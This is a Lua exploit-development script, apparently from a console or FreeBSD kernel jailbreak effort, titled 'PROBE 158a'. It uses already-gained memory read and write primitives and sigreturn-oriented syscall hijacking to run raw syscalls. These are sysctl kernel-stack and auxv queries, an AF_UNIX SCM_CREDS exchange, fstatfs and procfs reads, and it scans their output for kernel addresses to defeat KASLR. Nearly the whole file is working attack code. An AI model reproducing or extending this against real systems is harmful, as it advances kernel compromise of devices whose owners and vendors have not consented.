-- CRASH_CLASS: LOW
-- PROBE 158a: Deep sysctl + AF_UNIX credential leak for KASLR
--
-- Angles:
-- A) kern.proc.kstack — kernel stack traces contain kernel addresses
-- B) kern.proc.auxv — auxiliary vector might have kernel loader info
-- C) AF_UNIX socketpair + SCM_CREDS — credential passing may leak kernel struct addrs
-- D) fstatfs on various fds — filesystem info might contain kernel pointers
-- E) Open /proc/curproc/map — FreeBSD procfs memory map
-- F) getdirentries on /dev — scan directory entries for kernel pointers

print("=== PROBE 158a: KASLR DEEP SYSCTL + UNIX ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function wq(addr, val) memory.write_qword(addr, val) end
local function wd(addr, val) memory.write_dword(addr, val) end
local function rd(addr) return to_num(memory.read_dword(addr)) end
local function rq(addr) return memory.read_qword(addr) end

local pid = to_num(make_syscall(20)())
print("pid=" .. pid)

local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local sc_mmap = make_syscall(477)
local MC = 0x40
local srop_ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(srop_ctx)) end)
local brip = memory.read_qword(srop_ctx + MC + 0xA0)
local rh, rl = get_hi_lo(brip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(srop_ctx)) end)
    wq(srop_ctx + MC + 0xA0, sc_addr)
    wq(srop_ctx + MC + 0x38, uint64(num))
    if a1 then wq(srop_ctx + MC + 0x08, a1) end
    if a2 then wq(srop_ctx + MC + 0x10, a2) end
    if a3 then wq(srop_ctx + MC + 0x18, a3) end
    if a4 then wq(srop_ctx + MC + 0x50, a4) end
    if a5 then wq(srop_ctx + MC + 0x28, a5) end
    if a6 then wq(srop_ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(srop_ctx)) end)
    if not ok then return nil end
    return rv
end

local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x400000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
local gh, gl = get_hi_lo(gpu)
local function ga(off) return uint64(string.format("0x%X%08X", gh, gl + off)) end

local function scan_for_kptrs(base, size, label)
    local found = 0
    for off = 0, size - 8, 8 do
        local ok, val = pcall(function() return rq(base + off) end)
        if ok then
            local vh, vl = get_hi_lo(val)
            if vh >= 0xFFFF8000 and vh < 0xFFFFFFFF then
                found = found + 1
                print("  " .. label .. "+" .. string.format("%04X", off) ..
                    "=0x" .. string.format("%X%08X", vh, vl))
            end
        end
    end
    return found
end

local function do_sysctl(mib_words, outsize)
    local mib = gpu + 0x10000
    for i = 1, #mib_words do wd(mib + (i-1)*4, mib_words[i]) end
    local outbuf = gpu + 0x11000
    for off = 0, outsize - 4, 4 do wd(outbuf + off, 0) end
    local oldlenp = gpu + 0x10F00
    wd(oldlenp, outsize)
    wd(oldlenp + 4, 0)
    local rv = srop(202, ga(0x10000), uint64(#mib_words),
        ga(0x11000), ga(0x10F00), uint64(0), uint64(0))
    local retv = rv and to_num(rv) or -999
    local actual = rd(oldlenp)
    return retv, actual
end

-- [A] kern.proc.kstack — MIB: 1.14.15.pid
print("--- [A] KERN.PROC.KSTACK ---")
local rv, sz = do_sysctl({1, 14, 15, pid}, 0x2000)
print("kstack: ret=" .. rv .. " size=" .. sz)
if rv == 0 and sz > 0 then
    local kp = scan_for_kptrs(gpu + 0x11000, math.min(sz, 0x2000), "kstack")
    print("kstack_kptrs=" .. kp)
    -- Also dump first 64 bytes as text
    local txt = ""
    for i = 0, math.min(sz - 1, 63) do
        local b = rd(gpu + 0x11000 + i) % 256
        if b >= 32 and b <= 126 then txt = txt .. string.char(b)
        elseif b == 0 then txt = txt .. "|"
        else txt = txt .. "." end
    end
    print("kstack_text: " .. txt)
end

-- [B] kern.proc.auxv — MIB: 1.14.16.pid
print("")
print("--- [B] KERN.PROC.AUXV ---")
rv, sz = do_sysctl({1, 14, 16, pid}, 0x2000)
print("auxv: ret=" .. rv .. " size=" .. sz)
if rv == 0 and sz > 0 then
    local kp = scan_for_kptrs(gpu + 0x11000, math.min(sz, 0x2000), "auxv")
    print("auxv_kptrs=" .. kp)
    -- Dump auxv entries (type, value pairs — each 16 bytes on amd64)
    for off = 0, math.min(sz - 16, 0x100), 16 do
        local atype = rd(gpu + 0x11000 + off)
        local aval = rq(gpu + 0x11000 + off + 8)
        local avh, avl = get_hi_lo(aval)
        if atype > 0 then
            print("  auxv[" .. atype .. "]=0x" .. string.format("%X%08X", avh, avl))
        end
    end
end

-- [C] kern.proc.groups — MIB: 1.14.17.pid (maybe)
-- Actually try several KERN_PROC sub-MIBs
print("")
print("--- [C] KERN.PROC SUB-MIBS ---")
for sub = 1, 20 do
    if sub ~= 1 and sub ~= 14 then  -- skip known working ones
        rv, sz = do_sysctl({1, 14, sub, pid}, 0x2000)
        if rv == 0 and sz > 0 then
            local kp = scan_for_kptrs(gpu + 0x11000, math.min(sz, 0x2000), "sub" .. sub)
            print("  sub=" .. sub .. " ret=" .. rv .. " sz=" .. sz .. " kptrs=" .. kp)
        elseif rv ~= -999 then
            print("  sub=" .. sub .. " ret=" .. rv)
        end
    end
end

-- [D] AF_UNIX socketpair
print("")
print("--- [D] AF_UNIX SOCKETPAIR ---")
-- socketpair(AF_UNIX=1, SOCK_STREAM=1, 0, sv[2])
local svp = gpu + 0x20000
wd(svp, 0)
wd(svp + 4, 0)
local sp = srop(135, uint64(1), uint64(1), uint64(0), ga(0x20000))
local spv = sp and to_num(sp) or -999
print("socketpair=" .. spv)

if spv == 0 then
    local fd0 = rd(svp)
    local fd1 = rd(svp + 4)
    print("fds: " .. fd0 .. ", " .. fd1)

    -- Send SCM_CREDS through the socket
    -- struct msghdr layout:
    --   msg_name(8) msg_namelen(4) pad(4)
    --   msg_iov(8) msg_iovlen(4) pad(4)
    --   msg_control(8) msg_controllen(4) pad(4)
    --   msg_flags(4)
    local MSG = gpu + 0x21000

    -- Build iov
    local IOV = gpu + 0x22000
    local DATA = gpu + 0x23000
    wd(DATA, 0x41)  -- one byte of data
    wq(IOV, ga(0x23000))  -- iov_base
    wq(IOV + 8, uint64(1))  -- iov_len

    -- Build cmsg for SCM_CREDS
    -- struct cmsghdr: cmsg_len(4) cmsg_level(4) cmsg_type(4)
    -- SCM_CREDS level=0xFFFF(SOL_SOCKET) type=3
    -- cmsg data is struct cmsgcred (FreeBSD):
    --   pid(4) uid(4) euid(4) gid(4) ngroups(2) groups[16](64) = 82 bytes total
    local CMSG = gpu + 0x24000
    wd(CMSG, 12 + 84)  -- cmsg_len = header + cmsgcred
    wd(CMSG + 4, 0xFFFF)  -- SOL_SOCKET
    wd(CMSG + 8, 3)  -- SCM_CREDS

    -- msghdr
    for off = 0, 0x3F, 4 do wd(MSG + off, 0) end
    wq(MSG + 16, ga(0x22000))  -- msg_iov
    wd(MSG + 24, 1)  -- msg_iovlen
    wq(MSG + 32, ga(0x24000))  -- msg_control
    wd(MSG + 40, 12 + 84)  -- msg_controllen

    -- sendmsg(fd0, msg, 0)
    local sm = srop(28, uint64(fd0), ga(0x21000), uint64(0))
    local smv = sm and to_num(sm) or -999
    print("sendmsg(SCM_CREDS)=" .. smv)

    -- Receive on fd1
    local RMSG = gpu + 0x25000
    local RIOV = gpu + 0x26000
    local RDATA = gpu + 0x27000
    local RCMSG = gpu + 0x28000
    for off = 0, 0xFF, 4 do wd(RCMSG + off, 0) end
    wd(RDATA, 0)
    wq(RIOV, ga(0x27000))
    wq(RIOV + 8, uint64(4))
    for off = 0, 0x3F, 4 do wd(RMSG + off, 0) end
    wq(RMSG + 16, ga(0x26000))
    wd(RMSG + 24, 1)
    wq(RMSG + 32, ga(0x28000))
    wd(RMSG + 40, 256)  -- big controllen

    -- recvmsg(fd1, rmsg, 0)
    local rm = srop(27, uint64(fd1), ga(0x25000), uint64(0))
    local rmv = rm and to_num(rm) or -999
    print("recvmsg=" .. rmv)

    if rmv > 0 or rmv == 0 then
        -- Check cmsg
        local clen = rd(RCMSG)
        local clevel = rd(RCMSG + 4)
        local ctype = rd(RCMSG + 8)
        print("cmsg: len=" .. clen .. " level=0x" .. string.format("%X", clevel) ..
            " type=" .. ctype)

        if clen > 12 then
            -- Scan cmsgcred for kernel pointers
            local kp = scan_for_kptrs(RCMSG + 12, clen - 12, "cmsg")
            print("cmsg_kptrs=" .. kp)
            -- Dump cmsgcred fields
            local cpid = rd(RCMSG + 12)
            local cuid = rd(RCMSG + 16)
            local ceuid = rd(RCMSG + 20)
            local cgid = rd(RCMSG + 24)
            print("cmsgcred: pid=" .. cpid .. " uid=" .. cuid ..
                " euid=" .. ceuid .. " gid=" .. cgid)
        end

        -- Scan full receive buffer
        local rk = scan_for_kptrs(RCMSG, 256, "rcmsg")
        print("rcmsg_kptrs=" .. rk)
    end

    srop(6, uint64(fd0))
    srop(6, uint64(fd1))
else
    print("socketpair failed, trying AF_UNIX socket+bind")
    -- Try creating AF_UNIX socket manually
    local ux = srop(97, uint64(1), uint64(1), uint64(0))
    local uxv = ux and to_num(ux) or -1
    print("unix_socket=" .. uxv)
    if uxv >= 0 then srop(6, uint64(uxv)) end
end

-- [E] fstatfs on various fds
print("")
print("--- [E] FSTATFS ---")
-- fstatfs(397) or statfs(396)
-- struct statfs is big (~0x200 bytes), might contain mount info
local sfbuf = gpu + 0x30000

-- Try on known fds: 0 (stdin?), server socket, shm, etc
for _, testfd in ipairs({0, 1, 2, 3}) do
    for off = 0, 0x1FF, 4 do wd(sfbuf + off, 0) end
    local fs = srop(397, uint64(testfd), ga(0x30000))
    local fsv = fs and to_num(fs) or -999
    if fsv == 0 then
        local kp = scan_for_kptrs(sfbuf, 0x200, "fstatfs_fd" .. testfd)
        print("fstatfs(fd=" .. testfd .. ")=0 kptrs=" .. kp)
        -- Dump f_fstypename (at offset varies, try common)
        -- On FreeBSD: f_version(4) f_type(4) f_flags(8) ...
        -- f_fstypename at +0x44 (16 bytes)
        local fstype = ""
        for i = 0, 15 do
            local b = rd(sfbuf + 0x44 + i) % 256
            if b > 0 and b < 128 then fstype = fstype .. string.char(b) end
        end
        if #fstype > 0 then print("  fstype: " .. fstype) end
    else
        print("fstatfs(fd=" .. testfd .. ")=" .. fsv)
    end
end

-- [F] Open /proc/curproc/map
print("")
print("--- [F] PROCFS ---")
local name_off = 0x3F000
local paths = {"/proc/curproc/map", "/proc/curproc/status", "/proc/self/maps"}
for _, p in ipairs(paths) do
    for i = 1, #p do wd(gpu + name_off + i - 1, string.byte(p, i)) end
    wd(gpu + name_off + #p, 0)
    local fd = srop(5, ga(name_off), uint64(0), uint64(0))
    local fdv = fd and to_num(fd) or -1
    print(p .. " fd=" .. fdv)
    if fdv >= 0 then
        -- Read some data
        local rbuf = gpu + 0x35000
        for off = 0, 0xFFF, 4 do wd(rbuf + off, 0) end
        local nr = srop(3, uint64(fdv), ga(0x35000), uint64(0x1000))
        local nrv = nr and to_num(nr) or -999
        print("  read=" .. nrv)
        if nrv > 0 then
            -- Print first 128 bytes as text
            local txt = ""
            for i = 0, math.min(nrv - 1, 127) do
                local b = rd(gpu + 0x35000 + i) % 256
                if b >= 32 and b <= 126 then txt = txt .. string.char(b)
                elseif b == 10 then txt = txt .. "\\n"
                else txt = txt .. "." end
            end
            print("  data: " .. txt)
            -- Scan for kernel pointers
            local kp = scan_for_kptrs(gpu + 0x35000, nrv, "proc")
            print("  kptrs=" .. kp)
        end
        srop(6, uint64(fdv))
    end
end

print("")
print("pid_post=" .. tostring(to_num(make_syscall(20)())))
print("=== DONE ===")
